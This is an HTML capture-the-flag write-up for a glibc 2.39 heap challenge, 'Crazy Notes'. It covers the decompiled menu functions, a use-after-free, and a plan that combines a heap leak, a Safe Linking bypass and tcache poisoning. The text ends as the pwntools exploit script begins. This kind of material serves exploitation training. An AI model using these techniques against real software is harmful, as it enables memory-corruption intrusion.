@@ -1,0 +1,929 @@
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Crazy Notes — Zereza's Blog</title>
+  <meta name="description" content="Blog de ciberseguridad. Writeups, notas técnicas e investigación.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='8' fill='%230E1120'/><circle cx='16' cy='16' r='6' fill='none' stroke='%237EC8E3' stroke-width='2'/><circle cx='16' cy='16' r='2' fill='%237EC8E3'/></svg>">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Crazy Notes | Zereza’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Crazy Notes" />
+<meta name="author" content="Miguel Peñaranda" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://0.0.0.0:4000/en/challenges/crazy-notes/" />
+<meta property="og:url" content="http://0.0.0.0:4000/en/challenges/crazy-notes/" />
+<meta property="og:site_name" content="Zereza’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-04-01T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Crazy Notes" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Miguel Peñaranda"},"dateModified":"2026-04-01T00:00:00+02:00","datePublished":"2026-04-01T00:00:00+02:00","description":"Introduction","headline":"Crazy Notes","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/en/challenges/crazy-notes/"},"url":"http://0.0.0.0:4000/en/challenges/crazy-notes/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav__inner">
+    <a href="/en/" class="nav__logo">
+      <span class="nav__logo-dot"></span>
+      Zereza's Blog
+    </a>
+    <ul class="nav__links" id="nav-links">
+      <li><a href="/en/" >home</a></li>
+      <li><a href="/en/about/" >whoami</a></li>
+      <li><a href="/en/posts/" >posts</a></li>
+      <li><a href="/en/challenges/" class="active">challenges</a></li>
+    </ul>
+    <div class="nav__tools">
+      <div class="lang-switch" aria-label="Language switcher">
+        <a href="/challenges/crazy-notes/" >ES</a>
+        <a href="/en/challenges/crazy-notes/" class="active">EN</a>
+      </div>
+      <a href="https://github.com/mzereza" target="_blank" rel="noopener" class="nav__cta">github ↗</a>
+    </div>
+    <button class="nav__burger" onclick="document.getElementById('nav-links').classList.toggle('open')">≡</button>
+  </div>
+</nav>
+
+<main>
+
+
+<div class="page page--with-toc">
+  <aside class="toc-sidebar" id="toc-sidebar">
+    <div class="toc-sidebar__inner">
+      <span class="toc-sidebar__title">Contents</span>
+      <nav class="toc-nav" id="toc-nav"></nav>
+    </div>
+  </aside>
+
+  <article class="post-wrap">
+
+    <a href="/en/challenges/" class="post-back">← volver a challenges</a>
+
+    <header class="post-header">
+      <div class="post-header-tags">
+        
+      </div>
+      <h1>Crazy Notes</h1>
+      <div class="post-header-meta">
+        
+        <span>April 01, 2026</span>
+        
+        
+      </div>
+    </header>
+
+    
+
+    <div class="prose" id="prose-content">
+      <h2 id="introduction">Introduction</h2>
+
+<p>In this challenge we are provided with:</p>
+<ul>
+  <li>The binary <a href="/assets/scripts/crazy-notes/chall"><strong>chall</strong></a></li>
+  <li>A libc <a href="/assets/scripts/crazy-notes/libc.so.6"><strong>libc.so.6</strong></a></li>
+  <li>A loader <a href="/assets/scripts/crazy-notes/ld-linux-x86-64.so.2"><strong>ld-linux-x86-64.so.2</strong></a></li>
+  <li>A Dockerfile <a href="/assets/scripts/crazy-notes/Dockerfile"><strong>Dockerfile</strong></a></li>
+  <li>A <strong>flag.txt</strong> file with the content <strong>“HackOn{FAKE_FLAG}”</strong>.</li>
+</ul>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<p>We start with the basic binary analysis, let’s run checksec to see what protections it has:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>zereza@kali:~/crazy-notes<span class="nv">$ </span>checksec chall
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    RUNPATH:    b<span class="s1">'.'</span>
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We see the challenge has <strong>NX</strong>, <strong>Canary</strong>, <strong>PIE</strong> and <strong>FULL RELRO</strong> protection.</p>
+
+<h2 id="analysis">Analysis</h2>
+
+<p>Analyzing the binary with <strong>Ghidra</strong>, we have the following pseudocode (I’ve renamed some variables):</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre></td><td class="rouge-code"><pre><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="n">bool</span> <span class="n">bVar1</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">option</span><span class="p">;</span>
+  
+  <span class="n">setup</span><span class="p">();</span>
+  <span class="n">bVar1</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">bVar1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">print_menu</span><span class="p">();</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%u"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">option</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)"</span><span class="p">);</span>
+      <span class="n">bVar1</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">delete</span><span class="p">();</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">create</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">edit</span><span class="p">();</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">setup</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">heap_base</span> <span class="o">=</span> <span class="n">sbrk</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">create</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="n">uint</span> <span class="n">index</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">size</span><span class="p">;</span>
+  <span class="n">world</span> <span class="o">*</span><span class="n">world</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
+  
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Index &gt; "</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%u"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">world_count</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Size &gt; "</span><span class="p">);</span>
+      <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%u"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">((</span><span class="n">size</span> <span class="o">&lt;</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mh">0x50</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Nooo!"</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+        <span class="n">world</span> <span class="o">=</span> <span class="p">(</span><span class="n">world</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">world</span> <span class="o">==</span> <span class="p">(</span><span class="n">world</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">print_err</span><span class="p">(</span><span class="s">"malloc failed"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Tierra &gt; "</span><span class="p">);</span>
+        <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="n">world</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Agua &gt; "</span><span class="p">);</span>
+        <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">world</span><span class="o">-&gt;</span><span class="n">water</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Aire &gt; "</span><span class="p">);</span>
+        <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">world</span><span class="o">-&gt;</span><span class="n">air</span><span class="p">);</span>
+        <span class="n">world</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+        <span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">((</span><span class="n">ulong</span><span class="p">)</span><span class="n">size</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">buffer</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">print_err</span><span class="p">(</span><span class="s">"malloc failed"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10000U</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">buffer</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">buffer</span> <span class="o">&lt;</span> <span class="n">heap_base</span><span class="p">))</span> <span class="p">{</span>
+          <span class="n">print_err</span><span class="p">(</span><span class="s">"a donde vas"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">world</span><span class="o">-&gt;</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">;</span>
+        <span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">world</span><span class="p">;</span>
+        <span class="n">world_count</span> <span class="o">=</span> <span class="n">world_count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">world</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">,</span><span class="mi">0</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">world</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Fill your world &gt; "</span><span class="p">);</span>
+        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">world</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">world</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"[-] basta ya de alocadas"</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Te pasaste"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">edit</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="n">uint</span> <span class="n">index</span><span class="p">;</span>
+  
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Index &gt; "</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%u"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="n">world</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">print_err</span><span class="p">(</span><span class="s">"Invalid index"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] earth &gt; "</span><span class="p">);</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] water &gt; "</span><span class="p">);</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">water</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] air &gt; "</span><span class="p">);</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">air</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(((</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">buffer</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+        <span class="p">(</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">buffer</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10000</span><span class="p">)))</span> <span class="o">&amp;&amp;</span>
+       <span class="p">(</span><span class="n">heap_base</span> <span class="o">&lt;</span> <span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Write your world &gt; "</span><span class="p">);</span>
+      <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Wrong index!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">delete</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="kt">char</span> <span class="n">sure</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">index</span><span class="p">;</span>
+  
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Index &gt; "</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%u"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="n">world</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">print_err</span><span class="p">(</span><span class="s">"Invalid index"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[!] You are deleting: "</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">Stats : %d - %d - %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">earth</span><span class="p">,</span>
+           <span class="p">(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">water</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">air</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">World : %.*s</span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Are you sure? (Y/N)&gt; "</span><span class="p">);</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">" %c"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">sure</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">sure</span> <span class="o">==</span> <span class="sc">'y'</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">sure</span> <span class="o">==</span> <span class="sc">'Y'</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">memset</span><span class="p">(</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">,</span><span class="mi">0</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">);</span>
+      <span class="n">memset</span><span class="p">(</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">],</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x18</span><span class="p">);</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">worlds</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Wrong index!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="program-flow">Program Flow</h2>
+
+<p>This program shows a menu with the following options:</p>
+<ol>
+  <li>Allocate a <strong>world struct</strong> of <strong>0x18</strong> bytes, and a <strong>buffer</strong> of size between <strong>0x30</strong> and <strong>0x50</strong> bytes.</li>
+  <li>Edit a <strong>world struct</strong> and its <strong>buffer</strong>, if it’s within heap range.</li>
+  <li>Show the data of a <strong>world struct</strong> and then choose whether to free the struct and the buffer. When freeing we erase all data from the <strong>world struct</strong>, but we don’t lose the reference to it <strong>(UAF!)</strong>.</li>
+</ol>
+
+<p>The <strong>world struct</strong> is defined as follows:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="k">typedef</span> <span class="k">struct</span> <span class="n">world</span><span class="p">{</span>
+    <span class="kt">int</span> <span class="n">earth</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">water</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">air</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
+    <span class="kt">void</span><span class="o">*</span> <span class="n">buffer</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="exploitation-strategy">Exploitation Strategy</h2>
+
+<p>When I do heap challenges, my methodology is usually:</p>
+<ol>
+  <li>Gain <strong>Arbitrary Read/Write</strong> or <strong>OOB Read/Write</strong>.</li>
+  <li>Leak <strong>Libc</strong>.</li>
+  <li>Find a way to gain <strong>Code Execution</strong>.</li>
+</ol>
+
+<h2 id="gaining-arbitrary-read--write">Gaining Arbitrary Read &amp; Write</h2>
+
+<p>We only have 8 allocations, so we need to use them wisely. When creating a <strong>world</strong>, two <code class="language-plaintext highlighter-rouge">malloc()</code> calls are made: one of <strong>0x20</strong> bytes where we fully control the first <strong>0xc</strong> bytes, and a second of a selectable size between <strong>0x30</strong> and <strong>0x50</strong> that we fully control. The idea is to allocate three <strong>worlds</strong>, free the first and show its data to leak the <strong>Heap Base</strong>, then free the second and do <strong>TCache Poisoning</strong> to allocate a chunk at the <code class="language-plaintext highlighter-rouge">void* buffer</code> of the second. This lets us control that pointer and gain <strong>Arbitrary Read &amp; Write</strong> within the <strong>heap</strong>. The third one is important for later.</p>
+
+<p>This challenge uses <strong>glibc</strong> version 2.39, which has <strong>Safe Linking</strong>.</p>
+
+<h3 id="safe-linking">Safe Linking</h3>
+<p><strong>Safe Linking</strong> is a <strong>TCache</strong> security measure. What it does is store <code class="language-plaintext highlighter-rouge">(heap_base &gt;&gt; 12) XOR next_ptr</code> instead of <code class="language-plaintext highlighter-rouge">next_ptr</code> in the <strong>Forward Pointer</strong> of freed <strong>chunks</strong>. So to do <strong>TCache Poisoning</strong> we’ll first need to leak the <strong>Heap Base</strong>. This is quite easy with our <strong>UAF</strong> — just read the <strong>Forward Pointer</strong> of the first freed chunk, since it will be <code class="language-plaintext highlighter-rouge">(heap_base &gt;&gt; 12) XOR 0</code>.</p>
+
+<hr />
+
+<p>To start the exploit I’ve defined the following functions:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./chall</span><span class="sh">"</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">tierra</span><span class="p">,</span> <span class="n">agua</span><span class="p">,</span> <span class="n">aire</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
